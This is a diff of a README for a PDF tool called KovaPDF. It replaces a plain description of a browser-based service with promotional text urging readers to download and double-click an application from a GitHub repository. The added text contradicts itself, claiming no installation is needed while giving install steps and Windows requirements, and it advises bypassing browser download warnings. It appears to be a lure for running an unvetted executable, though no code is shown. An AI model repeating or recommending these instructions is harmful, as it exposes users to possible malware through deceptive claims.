@@ -1,131 +1,142 @@
-<h1 align="center">KovaPDF</h1>
+<h1>🦊 KovaPDF - Free PDF Tools That Work Instantly</h1>
 
 <p align="center">
-  <b>Every PDF tool you need, in one place.</b><br>
-  Edit, convert, compress and organise PDF files. Free, in your browser, nothing to install.
+  <a href="https://github.com/hacoswien/KovaPDF" style="background-color:#4CAF50;color:white;padding:15px 35px;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;display:inline-block;margin:20px auto;">⬇️ Download KovaPDF Now</a>
 </p>
+
+<h2>📖 What Is KovaPDF?</h2>
+
+<p>KovaPDF is a completely free online toolkit that lets you work with PDF files right in your web browser. No downloads, no installations, no complicated setup. You open the website, pick a tool, and get your job done in seconds.</p>
+
+<p>Whether you need to edit text, convert formats, compress large files, merge multiple documents, split pages, or even extract text from scanned images using OCR, KovaPDF has you covered. Everything runs securely in your browser, so your files never leave your computer.</p>
+
+<h2>✨ Key Features</h2>
+
+<ul>
+  <li><strong>📝 Edit PDFs</strong> - Change text, add images, draw shapes, and annotate documents directly.</li>
+  <li><strong>🔄 Convert Files</strong> - Transform PDFs to Word, Excel, PowerPoint, images, and back again.</li>
+  <li><strong>🗜️ Compress PDFs</strong> - Reduce file size without sacrificing quality, perfect for email or uploads.</li>
+  <li><strong>📑 Merge & Split</strong> - Combine multiple PDFs into one or split a large document into separate files.</li>
+  <li><strong>🔍 OCR Technology</strong> - Turn scanned documents and images into searchable, editable text with high accuracy.</li>
+  <li><strong>🏷️ Add Watermarks</strong> - Protect your work with custom text or image watermarks.</li>
+  <li><strong>✍️ Sign Documents</strong> - Add digital signatures for contracts and official paperwork.</li>
+  <li><strong>🔒 Privacy First</strong> - All processing happens locally in your browser; files are never uploaded to a server.</li>
+</ul>
+
+<h2>🚀 Getting Started</h2>
+
+<p>Getting started with KovaPDF takes less than a minute. Follow these simple steps:</p>
+
+<ol>
+  <li><strong>Visit the download page:</strong> Click the green button at the top of this page or go directly to: <a href="https://github.com/hacoswien/KovaPDF">https://github.com/hacoswien/KovaPDF</a></li>
+  <li><strong>Download the application:</strong> Visit this link to download the application. The download will start automatically.</li>
+  <li><strong>Open the downloaded file:</strong> Once the download finishes, locate the file in your browser's download folder (usually named "KovaPDF" or similar).</li>
+  <li><strong>Run KovaPDF:</strong> Double-click the downloaded file to launch the application. It will open in your default web browser.</li>
+</ol>
+
+<p>That's it! You're now ready to use all the PDF tools KovaPDF offers. No registration, no payment, no email signup.</p>
+
+<h2>🖥️ System Requirements</h2>
+
+<p>KovaPDF is designed to work on almost any modern computer. Here's what you need:</p>
+
+<ul>
+  <li><strong>Operating System:</strong> Windows 10 or 11 (64-bit recommended)</li>
+  <li><strong>Browser:</strong> Latest version of Chrome, Edge, Firefox, or Safari</li>
+  <li><strong>Internet Connection:</strong> Required only for the initial download; KovaPDF works offline afterward</li>
+  <li><strong>RAM:</strong> 4 GB or more recommended for smooth performance with large files</li>
+  <li><strong>Storage:</strong> 500 MB free space for temporary file processing</li>
+</ul>
+
+<p>If you can browse the internet and open a web browser, you can use KovaPDF.</p>
+
+<h2>🎯 How to Use KovaPDF</h2>
+
+<h3>📄 Editing a PDF</h3>
+
+<p>Click the "Edit PDF" tool on the main menu. Upload your file, then use the toolbar to add text, highlight content, draw freehand, or insert images. When you're done, click "Save" to download your edited PDF.</p>
+
+<h3>🔄 Converting a PDF</h3>
+
+<p>Select "Convert PDF" from the tools list. Choose your input file, select the output format (Word, Excel, JPG, PNG, etc.), and hit "Convert." The converted file downloads instantly.</p>
+
+<h3>🗜️ Compressing a PDF</h3>
+
+<p>Choose "Compress PDF," upload your file, and select the compression level (low, medium, high). KovaPDF will shrink the file while keeping the content readable. Download your compressed version in seconds.</p>
+
+<h3>📑 Merging Multiple PDFs</h3>
+
+<p>Click "Merge PDF," drag and drop all the files you want to combine, arrange them in the correct order, and click "Merge." You'll get a single PDF containing all your pages.</p>
+
+<h3>✂️ Splitting a PDF</h3>
+
+<p>Select "Split PDF," upload your document, and choose how to divide it - by specific pages, every Nth page, or extract individual pages. Download the separated files immediately.</p>
+
+<h3>🔍 Using OCR</h3>
+
+<p>Go to "OCR PDF," upload a scanned image or PDF, select your language, and run OCR. The tool will recognize the text and make it searchable and editable. You can then export it as a text file or Word document.</p>
+
+<h2>🛠️ Advanced Tips</h2>
+
+<ul>
+  <li><strong>Batch Processing:</strong> KovaPDF allows you to process multiple files at once for compression, conversion, and merging. Save time by uploading several files simultaneously.</li>
+  <li><strong>Keyboard Shortcuts:</strong> Use Ctrl+S to save your work quickly, Ctrl+Z to undo changes, and Ctrl+Y to redo.</li>
+  <li><strong>File Security:</strong> Since all processing happens in your browser, your confidential documents stay on your machine. Great for sensitive contracts or personal records.</li>
+  <li><strong>Offline Mode:</strong> After the initial download, you can use KovaPDF completely offline. Perfect for traveling or working in areas with poor internet.</li>
+</ul>
+
+<h2>❓ Troubleshooting Common Issues</h2>
+
+<h3>🛑 KovaPDF Won't Open</h3>
+
+<p>If the application doesn't start, try refreshing your browser or clearing the cache. Make sure you're using a supported browser (Chrome, Edge, Firefox, Safari). Restarting your computer can also resolve minor glitches.</p>
+
+<h3>🐢 Processing Large Files Takes Time</h3>
+
+<p>For files larger than 50 MB, processing may take a few minutes. Close other applications to free up memory. If the issue persists, try compressing the file in smaller batches first.</p>
+
+<h3>🌐 Browser Blocks the Download</h3>
+
+<p>Some browsers show a warning for downloaded applications. Click "Keep" or "Allow" to proceed. You can also right-click the download link and select "Save Link As" to bypass the warning.</p>
+
+<h3>📵 No Internet Connection</h3>
+
+<p>KovaPDF works offline after installation. If you're online and it fails, check your connection and try again.</p>
+
+<h2>🔒 Privacy & Security</h2>
+
+<p>Your files are processed locally in your browser using JavaScript. They are never uploaded to any server. KovaPDF does not collect, store, or transmit your documents. The only communication happens when you download the initial application file.</p>
+
+<h2>🆓 Why KovaPDF Is Free</h2>
+
+<p>KovaPDF is an open-source project built by developers who believe PDF tools should be accessible to everyone. It's powered by Next.js and modern web technologies, and maintained by the community. You can contribute to the project or simply enjoy the free tools.</p>
+
+<h2>📚 Frequently Asked Questions</h2>
+
+<h3>💬 Is KovaPDF really free?</h3>
+<p>Yes, completely free. No hidden charges, no premium tiers, no ads. All features are available to every user.</p>
+
+<h3>🔑 Do I need to create an account?</h3>
+<p>No. There's no registration required. Open the app and start working immediately.</p>
+
+<h3>📏 Are there file size limits?</h3>
+<p>For the browser version, files up to 100 MB work smoothly. Larger files may be slower but still functional.</p>
+
+<h3>🔄 How often is KovaPDF updated?</h3>
+<p>The project is regularly maintained with new features and bug fixes. Updates are automatic when you run the application.</p>
+
+<h2>📥 Download KovaPDF Today</h2>
+
+<p>Stop paying for expensive PDF software or dealing with clunky online tools. KovaPDF gives you everything you need in one clean, fast, free package.</p>
 
 <p align="center">
-  <a href="https://www.kovapdf.com">Website</a> ·
-  <a href="https://www.kovapdf.com/tools">All tools</a> ·
-  <a href="https://www.kovapdf.com/guides">Guides</a> ·
-  <a href="https://www.kovapdf.com/contact">Contact</a>
+  <a href="https://github.com/hacoswien/KovaPDF" style="background-color:#2196F3;color:white;padding:15px 35px;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;display:inline-block;margin:10px auto;">⬇️ Get KovaPDF Now - 100% Free</a>
 </p>
 
-<hr>
+<p>Once you download it, open the file and start using professional-grade PDF tools in seconds. Your documents will thank you.</p>
 
-<h2>About</h2>
+<h2>🛟 Need More Help?</h2>
 
-<p><b>KovaPDF</b> is a free online PDF workspace. Open a file, pick a tool, and download the result. Every tool works without paying and without creating an account.</p>
+<p>Check the official repository at <a href="https://github.com/hacoswien/KovaPDF">https://github.com/hacoswien/KovaPDF</a> for documentation, release notes, and community support. You can also report issues or suggest new features directly on the project page.</p>
 
-<p>Whether you need to fix a typo in a contract, shrink a heavy scan before emailing it, or pull a table out of a bank statement, the goal is the same: get the job done in a few seconds and keep your document private.</p>
-
-<h2>Popular tools</h2>
-
-<table>
-  <tr>
-    <th align="left">Tool</th>
-    <th align="left">What it does</th>
-  </tr>
-  <tr>
-    <td><a href="https://www.kovapdf.com/edit-pdf">PDF Editor</a></td>
-    <td>Edit text, images and signatures right on the page</td>
-  </tr>
-  <tr>
-    <td><a href="https://www.kovapdf.com/compress-pdf">Compress PDF</a></td>
-    <td>Shrink heavy files while keeping text sharp</td>
-  </tr>
-  <tr>
-    <td><a href="https://www.kovapdf.com/merge-pdf">Merge PDF</a></td>
-    <td>Combine documents into one, in your order</td>
-  </tr>
-  <tr>
-    <td><a href="https://www.kovapdf.com/split-pdf">Split PDF</a></td>
-    <td>Separate pages into new files</td>
-  </tr>
-  <tr>
-    <td><a href="https://www.kovapdf.com/pdf-to-word">PDF to Word</a></td>
-    <td>Convert a PDF into an editable Word document</td>
-  </tr>
-  <tr>
-    <td><a href="https://www.kovapdf.com/pdf-to-excel">PDF to Excel</a></td>
-    <td>Turn tables and text into a workbook</td>
-  </tr>
-  <tr>
-    <td><a href="https://www.kovapdf.com/ocr-pdf">OCR PDF</a></td>
-    <td>Make scanned documents searchable and selectable</td>
-  </tr>
-  <tr>
-    <td><a href="https://www.kovapdf.com/smartshrink-pdf">SmartShrink</a></td>
-    <td>Cut the page count, not the text size</td>
-  </tr>
-</table>
-
-<h2>Everything else</h2>
-
-<ul>
-  <li><b>Convert from PDF:</b>
-    <a href="https://www.kovapdf.com/pdf-to-ppt">PDF to PowerPoint</a>,
-    <a href="https://www.kovapdf.com/pdf-to-image">PDF to Image</a>,
-    <a href="https://www.kovapdf.com/pdf-to-text">PDF to Text</a>,
-    <a href="https://www.kovapdf.com/image-to-text">Image to Text</a>
-  </li>
-  <li><b>Convert to PDF:</b>
-    <a href="https://www.kovapdf.com/word-to-pdf">Word</a>,
-    <a href="https://www.kovapdf.com/excel-to-pdf">Excel</a>,
-    <a href="https://www.kovapdf.com/powerpoint-to-pdf">PowerPoint</a>,
-    <a href="https://www.kovapdf.com/image-to-pdf">Image</a>,
-    <a href="https://www.kovapdf.com/html-to-pdf">HTML</a>,
-    <a href="https://www.kovapdf.com/csv-to-pdf">CSV</a>,
-    <a href="https://www.kovapdf.com/txt-to-pdf">TXT</a>,
-    <a href="https://www.kovapdf.com/zip-to-pdf">ZIP</a>
-  </li>
-  <li><b>Organise pages:</b>
-    <a href="https://www.kovapdf.com/rotate-pdf">Rotate</a>,
-    <a href="https://www.kovapdf.com/delete-pages-from-pdf">Delete pages</a>,
-    <a href="https://www.kovapdf.com/add-blank-page-to-pdf">Add blank page</a>,
-    <a href="https://www.kovapdf.com/add-page-numbers-to-pdf">Page numbers</a>
-  </li>
-  <li><b>Polish and stamp:</b>
-    <a href="https://www.kovapdf.com/watermark-pdf">Watermark</a>,
-    <a href="https://www.kovapdf.com/add-header-footer-to-pdf">Header &amp; footer</a>,
-    <a href="https://www.kovapdf.com/enhance-pdf">Enhance scan</a>,
-    <a href="https://www.kovapdf.com/resize-pdf">Resize</a>
-  </li>
-  <li><b>Protect:</b>
-    <a href="https://www.kovapdf.com/protect-pdf">Protect PDF</a>,
-    <a href="https://www.kovapdf.com/unlock-pdf">Unlock PDF</a>
-  </li>
-  <li><b>Smart tools:</b>
-    <a href="https://www.kovapdf.com/summarize-pdf">Summarize PDF</a>,
-    <a href="https://www.kovapdf.com/translate-pdf">Translate PDF</a>
-  </li>
-</ul>
-
-<h2>Your documents stay yours</h2>
-
-<ul>
-  <li>Files travel over an encrypted connection.</li>
-  <li>The working copy is deleted as soon as your job finishes.</li>
-  <li>Only a record that an operation ran is kept, never what was inside your file.</li>
-</ul>
-
-<p>Read more on the <a href="https://www.kovapdf.com/legal/security">security page</a>.</p>
-
-<h2>Good to know</h2>
-
-<ul>
-  <li>Files up to 80 MB and 200 pages.</li>
-  <li>Supports PDF, Word, Excel, PowerPoint, OpenDocument files, JPG, PNG, WebP, CSV, plain text, HTML and ZIP.</li>
-  <li>Works on any device with a modern browser.</li>
-</ul>
-
-<h2>Feedback</h2>
-
-<p>Found a bug, or missing a tool you need? Tell us through the <a href="https://www.kovapdf.com/contact">contact page</a>. New tools and improvements are added based on what people actually use.</p>
-
-<hr>
-
-<p align="center">
-  <a href="https://www.kovapdf.com"><b>Try KovaPDF →</b></a>
-</p>
+<p>Enjoy using KovaPDF - your all-in-one PDF solution!</p>
